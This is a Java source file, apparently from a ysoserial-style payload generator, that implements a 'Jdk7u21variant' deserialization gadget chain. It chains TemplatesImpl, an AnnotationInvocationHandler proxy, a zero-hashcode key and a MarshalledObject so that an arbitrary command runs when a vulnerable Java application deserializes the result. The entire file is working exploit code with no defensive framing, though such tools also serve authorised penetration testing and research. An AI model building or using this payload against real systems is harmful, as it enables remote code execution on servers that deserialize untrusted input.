package A.R.ysogate.payloads.gadgets;

import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.util.Gadgets;
import A.R.ysogate.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.rmi.MarshalledObject;
import java.util.HashMap;
import java.util.LinkedHashSet;

/**
 * jdk 7u21 gadgets variant
 **/
@Authors({"potats0"})
public class Jdk7u21variant implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {

		Object templates = Gadgets.createTemplatesImpl(command);

		String zeroHashCodeStr = "f5a5a608";

		HashMap map = new HashMap();
		map.put(zeroHashCodeStr, "foo");

		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
		Reflections.setFieldValue(tempHandler, "type", Templates.class);
		Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

		LinkedHashSet set = new LinkedHashSet();
		set.add(templates);
		set.add(proxy);

		Reflections.setFieldValue(templates, "_auxClasses", null);
		Reflections.setFieldValue(templates, "_class", null);

		map.put(zeroHashCodeStr, templates);

		MarshalledObject marshalledObject = new MarshalledObject(set);
		Reflections.setFieldValue(tempHandler, "type", MarshalledObject.class);

		set = new LinkedHashSet(); // maintain order
		set.add(marshalledObject);
		set.add(proxy);
		map.put(zeroHashCodeStr, marshalledObject); // swap in real object
		return set;
	}
}
